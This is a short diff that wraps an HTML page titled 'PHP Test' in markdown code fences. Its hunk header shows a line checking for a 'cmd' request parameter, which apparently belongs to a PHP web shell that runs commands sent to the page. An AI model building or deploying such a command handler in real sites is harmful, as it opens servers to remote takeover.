@@ -1,3 +1,4 @@
+```html
 <html>
  <head>
   <title>PHP Test</title>
@@ -14,3 +15,4 @@ if(isset($_REQUEST['cmd'])){
 ?>
  </body>
 </html>
+```
